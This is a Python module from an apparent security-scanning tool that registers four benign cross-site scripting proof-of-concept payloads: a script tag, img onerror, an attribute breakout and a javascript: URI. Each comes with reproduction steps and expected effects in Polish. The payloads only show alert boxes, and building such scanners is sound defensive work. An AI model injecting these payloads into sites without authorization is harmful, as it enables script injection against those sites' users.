"""Safe XSS PoC payloads — Epic 4, Story 4.10.

Benign ``alert(1)`` style demonstrations that prove script execution without any
side effects on data or the host.
"""

from app.services.security_scan.poc_payloads.registry import PayloadTemplate, register

_VULN = "xss"

register(
    _VULN,
    PayloadTemplate(
        label="basic-script",
        payload="<script>alert(1)</script>",
        reproduction_steps=(
            "1. Otwórz stronę/pole, którego wartość jest renderowana bez kodowania.",
            "2. Wprowadź payload: <script>alert(1)</script>",
            "3. Załaduj stronę wyświetlającą tę wartość.",
        ),
        expected_effect="Przeglądarka wykonuje skrypt i wyświetla alert(1) — dowód wykonania kodu w kontekście strony.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="img-onerror",
        payload="<img src=x onerror=alert(1)>",
        reproduction_steps=(
            "1. Znajdź pole, które wstawia HTML bez sanityzacji.",
            "2. Wprowadź payload: <img src=x onerror=alert(1)>",
            "3. Obserwuj wykonanie handlera onerror.",
        ),
        expected_effect="Nieudane załadowanie obrazka wyzwala onerror i wykonuje alert(1).",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="attribute-breakout",
        payload='"><script>alert(document.domain)</script>',
        reproduction_steps=(
            "1. Zidentyfikuj wartość wstawianą do atrybutu HTML.",
            '2. Wprowadź payload: "><script>alert(document.domain)</script>',
            "3. Obserwuj wyjście z atrybutu i wykonanie skryptu.",
        ),
        expected_effect="Payload zamyka atrybut i wstrzykuje skrypt, który wyświetla domenę — dowód kontekstu wykonania.",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="javascript-uri",
        payload="javascript:alert(1)",
        reproduction_steps=(
            "1. Znajdź pole przyjmujące URL (np. href).",
            "2. Wprowadź payload: javascript:alert(1)",
            "3. Kliknij wygenerowany odnośnik.",
        ),
        expected_effect="Kliknięcie odnośnika wykonuje javascript:alert(1) w kontekście strony.",
    ),
)
